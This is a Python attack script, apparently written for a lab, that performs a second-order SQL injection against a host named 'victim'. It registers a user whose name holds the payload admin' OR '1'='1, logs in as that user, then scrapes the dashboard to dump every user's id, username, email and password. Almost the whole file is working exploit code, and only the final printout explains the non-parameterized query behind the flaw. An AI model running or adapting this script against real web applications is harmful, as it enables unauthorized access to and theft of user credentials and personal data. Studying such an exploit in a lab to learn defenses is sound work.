import requests
import sys
import re
from bs4 import BeautifulSoup

# Victim server URL
VICTIM_URL = "http://victim:8080"

def print_banner():
    print("=" * 60)
    print("  Second-Order SQL Injection Attack")
    print("=" * 60)
    print()

def register_malicious_user():
    """Step 1: Register a user with SQLi payload"""
    print("[*] Step 1: Registering user with malicious payload...")
    
    # Payload SQL injection
    malicious_username = "admin' OR '1'='1"
    
    data = {
        "username": malicious_username,
        "email": "attacker@evil.com",
        "password": "hacked123"
    }
    
    try:
        response = requests.post(f"{VICTIM_URL}/register", data=data, allow_redirects=False)
        if response.status_code in [200, 302]:
            print(f"[+] User registered successfully!")
            print(f"    Username: {malicious_username}")
            print(f"    Email: {data['email']}")
            print(f"    Password: {data['password']}")
            return data
        else:
            print(f"[-] Registration error: {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return None

def login_user(credentials):
    """Step 2: Login with the malicious user"""
    print("\n[*] Step 2: Login with the malicious user...")
    
    data = {
        "username": credentials["username"],
        "password": credentials["password"]
    }
    
    try:
        session = requests.Session()
        response = session.post(f"{VICTIM_URL}/login", data=data, allow_redirects=False)
        
        if response.status_code in [200, 302]:
            print("[+] Login successful!")
            return session
        else:
            print(f"[-] Login error: {response.status_code}")
            return None
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return None

def access_dashboard(session):
    """Step 3: Access the dashboard and trigger the second-order SQLi"""
    print("\n[*] Step 3: Accessing the dashboard (trigger second-order SQLi)...")
    
    try:
        response = session.get(f"{VICTIM_URL}/dashboard")
        
        if response.status_code == 200:
            print("[+] Dashboard accessible!")
            
            # Parse HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract logged user info
            user_info = soup.find('div', class_='user-info')
            if user_info:
                print("\n[+] Logged User Info:")
                print(user_info.get_text(strip=True, separator='\n'))
            
            # Extract users table
            table = soup.find('table')
            if table:
                print("\n[+] Users Table Found:")
                print("=" * 80)
                
                # Header
                headers = [th.get_text(strip=True) for th in table.find_all('th')]
                header_line = " | ".join(f"{h:<15}" for h in headers)
                print(header_line)
                print("=" * 80)
                
                # Rows
                for row in table.find('tbody').find_all('tr'):
                    cells = [td.get_text(strip=True) for td in row.find_all('td')]
                    row_line = " | ".join(f"{c:<15}" for c in cells)
                    print(row_line)
                
                print("=" * 80)
            else:
                print("\n[-] No users table found in dashboard")
                
            return True
        else:
            print(f"[-] Error accessing the dashboard: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return False

def extract_users_from_html(html):
    """Extract user data from the HTML table"""
    users = []
    
    # Pattern to extract table rows
    # Look for all <tr> that are not the header
    rows = re.findall(r'<tr>.*?<td>(.*?)</td>.*?<td>(.*?)</td>.*?<td>(.*?)</td>.*?<td>(.*?)</td>.*?</tr>', html, re.DOTALL)
    
    for row in rows:
        user = {
            'id': row[0].strip(),
            'username': row[1].strip(),
            'email': row[2].strip(),
            'password': row[3].strip() if row[3].strip() != 'N/A' else 'N/A'
        }
        users.append(user)
    
    return users

def main():
    print_banner()
    
    # Step 1: Registration
    credentials = register_malicious_user()
    if not credentials:
        print("\n[!] Attack failed during registration phase")
        sys.exit(1)
    
    # Step 2: Login
    session = login_user(credentials)
    if not session:
        print("\n[!] Attack failed during login phase")
        sys.exit(1)
    
    # Step 3: Dashboard access
    success = access_dashboard(session)
    
    if success:
        print("\n" + "=" * 60)
        print("  ATTACK COMPLETED SUCCESSFULLY!")
        print("=" * 60)
        print("\n[i] The attack demonstrated a Second-Order SQLi vulnerability:")
        print("    1. The payload was safely stored in the DB")
        print("    2. The payload was retrieved from the DB as 'trusted data'")
        print("    3. The payload was used in a NON-parameterized query")
        print("    4. Result: unauthorized access to all data!")
    else:
        print("\n[!] Attack not completed")
        sys.exit(1)

if __name__ == "__main__":
    main()


